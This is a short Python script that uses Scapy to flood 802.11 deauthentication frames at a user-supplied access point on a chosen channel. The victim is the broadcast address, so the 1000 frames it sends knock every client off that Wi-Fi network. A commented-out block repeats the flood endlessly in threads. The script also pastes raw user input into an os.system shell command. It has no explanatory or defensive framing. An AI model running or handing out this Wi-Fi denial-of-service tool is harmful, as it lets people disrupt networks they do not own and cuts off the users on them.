from scapy.all import *
import sys
import os
from threading import Thread
interface = "wlx000c097012bf"
BSSID = input("Enter the MAC of AP ")
victim_mac = "FF:FF:FF:FF:FF:FF"
ch = input("Enter the channel number ")

#cmd1 = "iwconfig wlan1 channel "+ch
cmd2 = "iwconfig wlx000c097012bf channel "+ch
#os.system(cmd1)
os.system(cmd2)

frame= RadioTap()/ Dot11(addr1=BSSID,addr2=victim_mac, addr3=BSSID)/ Dot11Deauth()
frame1= RadioTap()/ Dot11(addr1=victim_mac,addr2=BSSID, addr3=BSSID)/ Dot11Deauth()
sendp(frame1,iface=interface, count= 1000, inter= .1)

'''
def for_ap(frame,interface):
	while True:
		sendp(frame, iface=interface, count=20, inter=.001)

def for_client(frame,interface):
	while True:
		sendp(frame, iface=interface, count=20, inter=.001)

#t1 = Thread(target=for_ap, args=(frame,interface))
#t1.start()
t2 = Thread(target=for_client, args=(frame1,interface))
t2.start()
'''
